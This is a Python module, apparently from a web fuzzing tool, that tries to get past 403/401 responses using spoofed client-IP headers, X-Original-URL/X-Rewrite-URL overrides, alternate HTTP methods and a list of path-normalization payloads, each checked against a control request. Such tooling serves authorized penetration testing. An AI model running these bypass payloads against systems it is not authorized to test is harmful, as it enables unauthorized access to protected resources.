import re
import difflib
import requests
import socket
from config import BYP
from modules.during_fuzzing.calibration import raw_request, rand_token, split_url, waf_block, same_template, other_title
from modules.output import record_finding


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Sent all together first (1 request per IP), split only if the combo bypasses
IP_HEADERS = [
	"X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "Client-IP", "X-Real-IP",
	"True-Client-IP", "Cluster-Client-IP", "X-Cluster-Client-IP", "X-ProxyUser-Ip", "X-Custom-IP-Authorization",
	"X-Forwarded", "Forwarded-For", "Forwarded-For-IP", "X-Forwarder-For", "X-Forwarded-For-Original", "X-Forwarded-By",
	"X-Original-Forwarded-For", "X-Original-Remote-Addr", "X-Trusted-IP", "Fastly-Client-IP"
]
IP_VALUES = ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1", "172.16.0.1", "::1", "0.0.0.0", "127.0.0.2", "2130706433", "0x7f000001"]

# {p}: forbidden path, {P}: uppercased (IIS / case insensitive ACL)
PATH_PAYLOADS = [
	"{p}/.", "{p}/./", "./{p}/./", "%2e/{p}", "{p}/.;/", ".;/{p}", "{p}..;/", "{p}/;/", "{p};/", "{p};.css",
	"{p}..%3B/", "{p}/%3B", "{p}.%3B/", "{p}/..;/", "{p}~", "{p}%20", "{p}%09", "{p}%00", "{p}?", "{p}??",
	"{p}%23", "{p}%3f", "{p}/*", "{p}/*/", "{p}%2f", "{p}/%2e", "{p}/%2e/", "{p}//", "/{p}//", "{p}%252f",
	"%2f{p}", ";/{p}", "{p}.json", "{P}"
]

# Not PUT/PATCH: an empty body on a writable resource can overwrite it
METHODS = ["POST", "OPTIONS"]

index_cache = {}


def same_page(a, b):
	"""Same page, dynamic parts allowed (big pages vary by a few hundred bytes)"""
	if a.status_code != b.status_code:
		return False
	la, lb = len(a.content), len(b.content)
	if la < 2048 and lb < 2048: # small page: same text (nonce / ids apart), a few bytes can be an admin panel
		sa, sb = re.sub(rb"\d+", b"", a.content), re.sub(rb"\d+", b"", b.content)
		m = difflib.SequenceMatcher(None, sa, sb, autojunk=False)
		return sa == sb or (m.quick_ratio() >= 0.95 and m.ratio() >= 0.95)
	if other_title(a, b):
		return False
	if abs(la - lb) <= max(50, 0.02 * max(la, lb)):
		return True
	wa, wb = len(a.content.split()), len(b.content.split())
	return (wa == wb and wa >= 30) or same_template(a, b)


def looks_open(r, original, index, exclude_len):
	if r is None or not 200 <= r.status_code < 300 or not r.content or waf_block(r):
		return False
	if exclude_len and str(len(r.content)) == str(exclude_len):
		return False
	if same_page(r, original) or any(same_page(r, i) for i in index):
		return False
	return True


def bypass_forbidden(res, exclude_len=False, headers=None, auth=None, directory=None):
	"""
	Bypass_forbidden: function for try to bypass code response 403/401
	Each potential bypass is replayed on a random path with the same trick (control):
	if the random path answers the same, it's a catch-all and not a bypass.
	"""
	s = requests.session()
	s.verify = False
	root, parent, last, trail, query = split_url(res)
	p = res[len(root):].rstrip("/")
	if not p:
		return
	ctrl = parent + rand_token(10) # same depth than the forbidden path
	found = []

	def send(method, url, extra=None):
		h = dict(headers or {})
		h.update(extra or {})
		try:
			return raw_request(s, method, url, headers=h, auth=auth, timeout=10)
		except Exception:
			return None

	original = send("GET", res)
	if original is None:
		return
	if not index_cache.get(root):
		# home page twice: X-Original-URL ignored = home page, its dynamic part must not look like a bypass
		index_cache[root] = [i for i in (send("GET", root), send("GET", root)) if i is not None]
	index = index_cache[root]
	if not index:
		return
	# same resource reachable without any trick: /en/shop/ is 403 but /en/shop is public -> not a bypass
	known = list(index)
	for variant in {root + p, root + p + "/"} - {res}:
		v = send("GET", variant)
		if v is not None and 200 <= v.status_code < 300 and v.content:
			known.append(v)

	def attempt(method, url, extra=None, ctrl_url=None, ctrl_extra=None):
		r = send(method, url, extra)
		if not looks_open(r, original, known, exclude_len):
			return None
		c = send(method, ctrl_url or url, ctrl_extra if ctrl_extra is not None else extra)
		if c is None or same_page(r, c):
			return None # catch-all, or no control = no proof
		return r

	def report(r, how):
		line = "{}[{}] {} Forbidden Bypass with: {} [{}b]".format(BYP, r.status_code, res, how, len(r.content))
		print("\033[K" + line)
		found.append(line)
		record_finding(directory, "bypass", res, r.status_code, len(r.content), how)

	# IP spoofing headers
	try:
		ips = IP_VALUES + [socket.gethostbyname(root.split("/")[2].split(":")[0])]
	except Exception:
		ips = IP_VALUES
	for ip in ips:
		combo = {h: ip for h in IP_HEADERS}
		combo["Forwarded"] = "for={}".format(ip if ":" not in ip else '"[{}]"'.format(ip))
		r = attempt("GET", res, combo, root + ctrl)
		if r is None:
			continue
		single_hit = False
		for h in combo:
			r_single = attempt("GET", res, {h: combo[h]}, root + ctrl)
			if r_single is not None:
				report(r_single, "-H '{}: {}'".format(h, combo[h]))
				single_hit = True
		if not single_hit:
			report(r, "all IP headers set to {}".format(ip))
		break

	# Path override headers (IIS / Symfony / Zend...)
	for h in ["X-Original-URL", "X-Rewrite-URL"]:
		r = attempt("GET", root, {h: "/" + p}, root, {h: "/" + ctrl})
		if r is not None:
			report(r, "GET / -H '{}: /{}'".format(h, p))

	# Other methods
	for m in METHODS:
		r = attempt(m, res, ctrl_url=root + ctrl)
		if r is not None:
			report(r, "method {}".format(m))

	# Path normalization tricks
	for payload in PATH_PAYLOADS:
		url_b = root + payload.format(p=p, P=p.upper())
		if payload == "{P}" and url_b == res.rstrip("/"):
			continue
		r = attempt("GET", url_b, ctrl_url=root + payload.format(p=ctrl, P=ctrl.upper()))
		if r is not None:
			report(r, url_b)

	if found and directory:
		try:
			with open(directory + "/output/bypass.txt", "a+") as bp:
				for line in found:
					bp.write(line.replace(BYP, "") + "\n")
		except Exception:
			pass


"""if __name__ == '__main__':
	res = ""
	bypass_forbidden(res)"""
